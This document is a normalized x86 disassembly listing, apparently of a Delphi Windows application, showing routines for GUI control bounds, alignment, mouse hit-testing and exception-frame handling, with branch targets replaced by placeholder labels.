lea edx [ esp + 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x10 ]
push eax
call PtInRect
test eax eax
je r-xdata
mov eax ebx
mov si 0xffeb
call sub_4034e4
sub_4416c0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
mov cl 0x1
mov eax ebx
call sub_441610
pop esi
pop ebx
retn
sub_4416e0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
mov cl 0x2
mov eax ebx
call sub_441610
pop esi
pop ebx
retn
sub_441700
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov eax [ rw-data ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov ax [ ebx + 0x4 ]
call sub_456ab8
mov [ ebx + 0x4 ] al
mov edx ebx
mov eax edi
mov si 0xffc9
call sub_4034e4
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ eax + 0x20 ] 0x1
mov edx 0x68
mov eax [ rw-data ]
call sub_44ade4
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_441758
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_43fed8
test al al
je r-xdata
and [ esi + 0x54 ] 0xfffe
xor edx edx
mov eax esi
call sub_43fee8
test [ esi + 0x54 ] 0x1
je r-xdata
pop esi
retn
push 0xffffffff
xor ecx ecx
mov edx 0x202
mov eax esi
call sub_440e64
pop esi
retn
sub_441798
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x74 ]
mov edx [ eax + 0xc ]
test edx edx
jbe r-xdata
mov edx [ eax + 0x14 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x48 ]
jge r-xdata
mov edx [ eax + 0x8 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x48 ]
jle r-xdata
mov edx [ ebx + 0x48 ]
mov [ eax + 0xc ] edx
jmp r-xdata
mov edx [ eax + 0x10 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x4c ]
jge r-xdata
mov edx [ ebx + 0x48 ]
mov [ eax + 0x14 ] edx
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
cmp edx [ ebx + 0x4c ]
jle r-xdata
mov edx [ ebx + 0x4c ]
mov [ eax + 0x8 ] edx
jmp r-xdata
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
mov edx [ ebx + 0x4c ]
mov [ eax + 0x10 ] edx
test [ ebx + 0x55 ] 0x4
jne r-xdata
test [ eax + 0x18 ] 0x1
jne r-xdata
cmp [ eax + 0x10 ] 0x0
je r-xdata
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov eax ebx
call sub_440e98
sub_441846
add [ eax ] al
test [ eax + 0x1c ] 0x10
je r-xdata
cmp [ eax + 0x57 ] 0x0
je r-xdata
test [ eax + 0x51 ] 0x4
je r-xdata
xor ecx ecx
jmp r-xdata
test [ eax + 0x50 ] 0x40
jne r-xdata
retn
mov dl 0x1
call sub_4400f8
mov cl 0x1
sub_441888
push ebx
mov ebx eax
cmp [ ebx + 0x5a ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x70 ]
mov eax ebx
call sub_43fe50
mov edx [ edx + 0x8 ]
mov eax ebx
call sub_43fe50
jmp r-xdata
mov [ ebx + 0x5a ] 0x1
sub_4418b8
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x60 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
mov [ ebx + 0x60 ] 0x1
mov dl [ esi + 0x5f ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x70 ]
sub_4418dc
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx edx
mov edi eax
xor eax eax
mov [ ebx + 0xc ] eax
mov edx esp
mov eax [ ebx + 0x8 ]
call sub_406cec
push esp
movsx ecx [ ebx + 0x6 ]
mov dl [ ebx + 0x4 ]
mov eax edi
mov si 0xffe2
call sub_4034e4
test al al
je r-xdata
mov esi [ edi + 0x30 ]
test esi esi
je r-xdata
mov [ ebx + 0xc ] 0x1
jmp r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx 0xb043
mov eax esi
call sub_440e64
mov [ ebx + 0xc ] eax
sub_441980
push ebx
mov ebx eax
cmp [ ebx + 0x59 ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x68 ]
mov eax ebx
call sub_43fda4
mov edx [ edx + 0x8 ]
mov eax ebx
call sub_43fda4
jmp r-xdata
mov [ ebx + 0x59 ] 0x1
sub_441a14
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
xor esi esi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
test eax eax
je r-xdata
mov eax esi
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov edi eax
mov eax ebx
call sub_403230
cmp edi eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov dl 0x1
call [ eax + 0x2c ]
mov esi eax
mov edx [ esp + 0x4 ]
mov eax esi
call sub_43f444
mov edx [ esp ]
mov eax esi
call sub_43f420
mov edx [ esp + 0x8 ]
sub edx [ esp ]
mov eax esi
call sub_43f6cc
mov edx [ esp + 0xc ]
sub edx [ esp + 0x4 ]
mov eax esi
call sub_43f710
sub_441a98
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
lea ecx [ ebp - 0x10 ]
mov eax [ edi ]
mov edx [ eax + 0x44 ]
mov eax [ edi ]
mov eax [ eax + 0x40 ]
call sub_416114
lea edx [ ebp - 0x10 ]
lea ecx [ ebp - 0x8 ]
mov eax [ edi ]
mov eax [ eax + 0x30 ]
call sub_43f7c8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
lea ebx [ eax + 0x44 ]
mov eax [ ebx + 0xc ]
sub eax [ ebx + 0x4 ]
mov edx [ edi ]
mov esi [ edx + 0x30 ]
add eax [ esi + 0x4c ]
mov edx [ edi ]
sub eax [ edx + 0x4c ]
push eax
lea eax [ ebp - 0x20 ]
push eax
mov ecx [ ebx + 0x8 ]
sub ecx [ ebx ]
add ecx [ esi + 0x48 ]
mov eax [ edi ]
sub ecx [ eax + 0x48 ]
mov edx [ esi + 0x44 ]
add edx [ ebx + 0x4 ]
sub edx [ ebp - 0x4 ]
mov eax [ esi + 0x40 ]
add eax [ ebx ]
sub eax [ ebp - 0x8 ]
call sub_416164
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_43f670
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_441b24
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
lea edx [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
call sub_441a14
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ eax + 0x4 ] ebx
mov eax ebx
call sub_4464d0
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x8 ]
mov [ edx + 0x8 ] eax
push ebp
call sub_441a98
pop ecx
jmp r-xdata
sub_441b84
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_441c72
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_441c79
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40405c
retn
test bl bl
je r-xdata
mov edx [ edi + 0x64 ]
mov eax esi
call sub_43fce0
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_43fcb0
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov dl [ edi + 0x6a ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x64 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
cmp al 0x1
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_43fcb0
mov eax [ ebp - 0x8 ]
mov edx [ esi + 0x8 ]
call sub_404444
jne r-xdata
lea eax [ esi + 0x80 ]
mov edx [ edi + 0x7c ]
call sub_40408c
cmp [ esi + 0x80 ] 0x0
jne r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x86 ]
mov eax esi
call sub_43fbd0
cmp [ esi + 0x57 ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x40 ]
mov [ esi + 0x120 ] eax
mov eax [ edi + 0x44 ]
mov [ esi + 0x124 ] eax
cmp [ esi + 0x122 ] 0x0
jne r-xdata
test bl bl
je r-xdata
sub_441c80
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
cmp esi eax
jne r-xdata
pop esi
pop ebx
retn
xor ecx ecx
mov edx esi
mov eax ebx
mov si 0xffef
call sub_4034e4
sub_441cac
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_441ccc
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_441cec
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_441d0c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_441d2c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_441d4c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_441d6c
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_41d4e8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
mov eax ebx
call sub_43f304
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx eax
mov cl 0x1
mov eax ebx
mov si 0xffef
call sub_4034e4
sub_441da4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_441e40
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_417bf8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
mov edx eax
mov edi esi
mov eax edi
call sub_44c5f0
mov edx [ ebx + 0x80 ]
mov eax edi
call sub_44c728
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_43fcb0
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_44c488
mov dl [ ebx + 0x57 ]
mov eax edi
call sub_44c848
push [ ebx + 0x124 ]
push [ ebx + 0x120 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_441e47
lea eax [ ebp - 0x4 ]
call sub_404038
retn
sub_441e50
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
xor ebx ebx
mov ecx edx
test ecx ecx
jle r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
mov esi 0x1
mov edx [ ebp - 0x4 ]
add edx 0x8
inc esi
add edx 0x8
dec ecx
jne r-xdata
mov ebx esi
fld [ edx ]
mov eax [ ebp - 0x4 ]
fcomp [ eax + ebx * 8 ]
fnstsw ax
sahf
jae r-xdata
sub_441e8c
push ebx
push esi
push edi
push ebp
add esp 0xffffffc8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor ebx ebx
mov esi [ eax + 0x48 ]
mov edi [ eax + 0x4c ]
mov eax [ esp ]
test eax eax
jg r-xdata
cmp esi eax
jg r-xdata
mov bl 0x3
jmp r-xdata
mov edx [ esp + 0x4 ]
test edx edx
jg r-xdata
mov bl 0x4
jmp r-xdata
mov eax ebx
add esp 0x38
pop ebp
pop edi
pop esi
pop ebx
retn
cmp edi edx
jg r-xdata
mov bl 0x1
jmp r-xdata
mov ebp edx
sub edi edx
mov [ esp + 0x8 ] eax
sub esi eax
fild [ esp + 0x8 ]
fstp [ esp + 0xc ]
fwait
mov [ esp + 0x2c ] esi
fild [ esp + 0x2c ]
fstp [ esp + 0x14 ]
fwait
mov [ esp + 0x30 ] ebp
fild [ esp + 0x30 ]
fstp [ esp + 0x1c ]
fwait
mov [ esp + 0x34 ] edi
fild [ esp + 0x34 ]
fstp [ esp + 0x24 ]
fwait
lea eax [ esp + 0xc ]
mov edx 0x3
call sub_441e50
sub eax 0x1
jb r-xdata
mov bl 0x2
jmp r-xdata
mov bl 0x3
jmp r-xdata
je r-xdata
mov bl 0x4
jmp r-xdata
dec eax
je r-xdata
mov bl 0x1
jmp r-xdata
dec eax
je r-xdata
mov bl 0x2
jmp r-xdata
sub_441f3c
push ebx
mov ebx eax
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov edx eax
mov eax [ ebx + 0xa0 ]
call sub_403474
test al al
jne r-xdata
mov al 0x1
pop ebx
retn
sub_441f70
push ebx
test [ eax + 0x1c ] 0x1
jne r-xdata
pop ebx
retn
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x4c ]
push edx
mov ecx [ eax + 0x44 ]
mov edx [ eax + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
sub_441f90
push ebx
push esi
push edi
mov edi eax
mov ebx edx
mov eax edi
mov si 0xffc8
call sub_4034e4
test al al
je r-xdata
mov eax edi
call sub_441fd0
or ebx eax
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax ebx
and eax 0x2
cmp eax 0x2
jne r-xdata
mov eax ebx
and eax 0x1
dec eax
je r-xdata
and ebx 0xfffffffd
jmp r-xdata
or ebx 0x2
sub_441ffc
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ edi + 0x8 ]
lea edx [ eax + 0x38 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x78 ]
test al al
jne r-xdata
mov [ edi + 0xc ] 0x1
sub_442028
push ebx
push esi
push edi
push ebp
add esp 0xffffffd4
mov ebp edx
mov edi eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
add esp 0x2c
pop ebp
pop edi
pop esi
pop ebx
retn
test [ edi + 0x1c ] 0x10
je r-xdata
mov edx esp
mov eax [ ebp + 0x8 ]
call sub_406cec
mov eax esp
call sub_41618c
test al al
je r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax edi
call sub_43f7f4
push [ esp + 0xc ]
push [ esp + 0xc ]
lea edx [ esp + 0x1c ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x1c ]
push eax
call PtInRect
test eax eax
jne r-xdata
mov eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
jmp r-xdata
mov [ esp + 0x10 ] 0x0
lea ecx [ esp + 0x10 ]
lea edx [ esp + 0x8 ]
mov eax edi
mov si 0xffe6
call sub_4034e4
xor eax eax
mov al [ esp + 0x10 ]
mov [ ebp + 0xc ] eax
cmp [ esp + 0x10 ] 0x0
jne r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
mov eax edi
mov si 0xffd6
call sub_4034e4
mov ebx eax
test ebx ebx
je r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebx + 0x61 ] 0x0
je r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor edx edx
mov eax edi
call sub_43f820
mov [ ebx + 0x64 ] edi
mov eax esp
call sub_41618c
test al al
je r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov [ ebp + 0xc ] 0x1
lea ecx [ esp + 0x24 ]
xor edx edx
xor eax eax
call sub_416114
lea edx [ esp + 0x24 ]
mov ecx esp
mov eax edi
call sub_43f7c8
sub_442150
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
cmp [ eax + 0x132 ] 0x0
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
push ecx
mov ebx eax
mov edx eax
lea ecx [ esp + 0x4 ]
mov eax [ ebx + 0x134 ]
call [ ebx + 0x130 ]
sub_442190
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43e9f4
mov eax esi
mov edx [ r-xdata ]
call sub_403498
mov [ ebx + 0x20 ] eax
pop esi
pop ebx
retn
sub_4421c4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor eax eax
push ebp
push sub_4422bc
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax ebx
call sub_43edb0
push ebx
push sub_443c54
call sub_41e128
mov [ ebx + 0x18c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_420a90
mov esi eax
mov [ ebx + 0x170 ] esi
mov edx [ ebx + 0x70 ]
mov eax esi
call sub_420c38
mov [ ebx + 0x1a9 ] 0x1
mov [ ebx + 0x1a0 ] 0xffffffff
mov [ ebx + 0x184 ] 0x3
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x11
jne r-xdata
add esp 0xfffffff0
call sub_40360c
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45d888
mov edx [ ebp - 0x8 ]
lea eax [ ebx + 0x188 ]
call sub_40408c
lea eax [ ebx + 0x188 ]
call sub_404038
jmp r-xdata
mov [ ebx + 0x1a7 ] 0x0
mov al [ r-xdata ]
mov [ ebx + 0x162 ] al
mov [ ebx + 0x163 ] 0x2
mov [ ebx + 0x164 ] 0x1
mov [ ebx + 0x168 ] 0x1
mov [ ebx + 0x150 ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4422c3
lea eax [ ebp - 0x8 ]
call sub_404038
retn
sub_4422c3
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_4422e8
push ebx
push esi
push edi
call sub_403674
mov ebx edx
mov edi eax
mov eax edi
call sub_41d338
cmp [ edi + 0x1a8 ] 0x0
je r-xdata
lea eax [ edi + 0x17c ]
call sub_405928
mov eax [ edi + 0x178 ]
call sub_4032e8
cmp [ edi + 0x30 ] 0x0
je r-xdata
mov [ edi + 0x1a8 ] 0x0
xor edx edx
mov eax edi
call sub_43d95c
cmp [ edi + 0x180 ] 0x0
je r-xdata
mov dl 0x1
mov eax edi
call sub_442f88
mov eax edi
call sub_4431c8
test eax eax
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0xac ]
mov eax [ edi + 0x170 ]
call sub_4032e8
mov eax [ edi + 0x18c ]
test eax eax
je r-xdata
mov edx eax
dec edx
mov eax edi
call sub_44318c
mov esi eax
mov edx esi
mov eax edi
call sub_442ff4
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov eax edi
call sub_4431c8
test eax eax
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_43ee88
test bl bl
jle r-xdata
call sub_41e1c0
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40365c
sub_4423b8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x19c ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032b8
mov [ ebp - 0xc ] eax
xor ecx ecx
push ebp
push sub_44247c
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_417710
mov ebx [ ebp - 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov ebx [ ebp - 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_4032e8
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
cmp edx [ ebp - 0x8 ]
jge r-xdata
inc esi
dec ebx
jne r-xdata
mov edx esi
call sub_446690
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
mov edx esi
call sub_417570
mov edx [ eax + 0x1a0 ]
test edx edx
jl r-xdata
mov ecx eax
mov eax [ ebp - 0xc ]
call sub_417664
mov edx esi
mov eax [ ebp - 0xc ]
call sub_417570
test eax eax
je r-xdata
sub_44248c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_442d30
xor eax eax
push ebp
push sub_4424cc
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43f0ec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4424d3
mov eax [ ebp - 0x4 ]
call sub_442d38
retn
sub_4424d3
mov eax [ ebp - 0x4 ]
call sub_4423b8
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_443b8c
pop ebx
pop ecx
pop ebp
retn
push 0x0
xor ecx ecx
mov edx 0xb011
mov eax [ ebp - 0x4 ]
call sub_440e64
sub_442508
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
xor ecx ecx
xor ebx ebx
mov bl [ ebp - 0x1 ]
cmp ebx 0x6
ja r-xdata
mov eax ecx
pop ebx
pop ecx
pop ebp
retn
jmp [ ebx * 4 + jump_table_442523 ]
mov edx [ edx + 0x44 ]
cmp edx [ eax + 0x44 ]
setg cl
jmp r-xdata
mov ecx [ edx + 0x44 ]
add ecx [ edx + 0x4c ]
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
cmp ecx edx
setle cl
jmp r-xdata
mov edx [ edx + 0x40 ]
cmp edx [ eax + 0x40 ]
setg cl
jmp r-xdata
mov ecx [ edx + 0x40 ]
add ecx [ edx + 0x48 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
cmp ecx edx
setle cl
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx - 0x4 ]
xchg ecx eax
xchg ecx edx
mov ebx [ eax ]
call [ ebx + 0xa4 ]
mov ecx eax
sub_442594
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x30 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x90 ] 0x0
je r-xdata
xor eax eax
mov al [ ebp - 0x5 ]
mov al [ eax + rw-data ]
mov edx [ ebp - 0x4 ]
cmp al [ edx + 0x61 ]
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x94 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_4467d4
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x14 ] eax
mov al [ ebp - 0x5 ]
add al 0xfd
sub al 0x2
jb r-xdata
lea ecx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x30 ]
mov edx [ ebx + 0x4c ]
mov eax [ ebx + 0x48 ]
call sub_416114
lea edx [ ebp - 0x40 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x34 ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
mov [ ebp - 0x18 ] eax
mov al [ ebp - 0x5 ]
dec eax
sub al 0x2
jb r-xdata
sub al 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x1
xor eax eax
push ebp
push sub_442915
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44291c
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x0
retn
jmp [ eax * 4 + jump_table_44282a ]
sub al 0x3
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
